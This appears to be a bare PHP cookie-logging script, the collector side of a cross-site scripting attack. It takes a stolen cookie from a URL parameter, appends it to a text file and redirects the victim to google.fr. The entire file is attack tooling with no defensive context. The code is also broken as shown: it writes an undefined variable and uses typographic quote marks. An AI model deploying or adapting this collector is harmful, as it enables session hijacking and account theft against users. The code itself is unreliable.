<?php
$cookie = $_GET[«c»];
if($cookie)
{
	$fp = fopen(«cookies.txt»,»a»);
	fputs($fp,$cook . «\r\n»);
	fclose($fp);
}
?>
<script>
location.replace(«http://www.google.fr»);
</script>
